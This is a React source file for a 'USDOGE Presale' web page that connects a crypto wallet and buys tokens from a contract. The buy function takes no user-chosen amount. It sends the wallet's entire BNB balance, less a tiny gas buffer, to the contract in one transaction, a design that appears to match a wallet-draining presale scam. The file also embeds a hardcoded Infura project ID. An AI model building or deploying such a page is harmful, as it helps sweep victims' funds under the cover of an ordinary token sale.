import React, { useState } from "react";
import { ethers } from "ethers";
import Web3Modal from "web3modal";
import WalletConnectProvider from "@walletconnect/web3-provider";
import { CONTRACT_ADDRESS, ABI } from "./constants";

function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [walletBalance, setWalletBalance] = useState("");
  const [maxPayable, setMaxPayable] = useState("");
  const [loading, setLoading] = useState(false);

  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        infuraId: "69fc40f8df4f46f28d1acb0ec3bab3c9", // Replace with your Infura Project ID
      },
    },
  };

  const connectWallet = async () => {
    try {
      const web3Modal = new Web3Modal({
        cacheProvider: true,
        providerOptions,
      });

      const instance = await web3Modal.connect();
      const provider = new ethers.providers.Web3Provider(instance);
      const signer = provider.getSigner();

      // Get wallet address
      const address = await signer.getAddress();
      setWalletAddress(address);

      // Get wallet balance
      const balance = await provider.getBalance(address);
      const formattedBalance = ethers.utils.formatEther(balance);

      const requiredGasBuffer = 0.0005; // Buffer for gas fees
      const maxBalance = Math.max(
        0,
        parseFloat(formattedBalance) - requiredGasBuffer
      ).toFixed(6);

      setWalletBalance(formattedBalance);
      setMaxPayable(maxBalance);

      if (parseFloat(formattedBalance) <= requiredGasBuffer) {
        alert(
          `Insufficient funds. You need at least ${requiredGasBuffer} BNB (gas fees) to complete a transaction.`
        );
      }
    } catch (error) {
      console.error("Wallet connection failed:", error);
      alert("Failed to connect wallet.");
    }
  };

  const buyTokens = async () => {
    if (!maxPayable || parseFloat(maxPayable) <= 0) {
      return alert(
        "Insufficient funds to proceed. Ensure you have enough BNB (including gas fees)."
      );
    }

    try {
      setLoading(true);
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);

      const value = ethers.utils.parseEther(maxPayable);
      const tx = await contract.buyTokens({ value });
      await tx.wait();

      alert("Tokens purchased successfully!");
    } catch (error) {
      console.error("Error:", error);
      alert(`Transaction failed: ${error.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-900 text-white">
      <header className="mb-10 text-center">
        <h1 className="text-4xl font-bold mb-4">USDOGE Presale</h1>
        <button
          onClick={connectWallet}
          className="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg"
        >
          {walletAddress
            ? `Connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
            : "Connect Wallet"}
        </button>
        {walletBalance && (
          <p className="mt-2 text-green-500">
            Wallet Balance: {parseFloat(walletBalance).toFixed(4)} BNB
          </p>
        )}
        {maxPayable && (
          <p className="mt-2 text-yellow-500">
            Max Payable Amount (after gas fees): {maxPayable} BNB
          </p>
        )}
      </header>
      <main className="w-full max-w-md p-6 bg-gray-800 rounded-lg shadow-md">
        <button
          onClick={buyTokens}
          disabled={loading || !maxPayable}
          className={`w-full px-4 py-2 bg-green-600 hover:bg-green-700 rounded-lg text-center ${loading ? "opacity-50 cursor-not-allowed" : ""
            }`}
        >
          {loading ? "Processing..." : `Buy Tokens (Max: ${maxPayable} BNB)`}
        </button>
      </main>
      <footer className="mt-10 text-sm text-gray-500">
        Powered by Web3Modal and ethers.js
      </footer>
    </div>
  );
}

export default App;
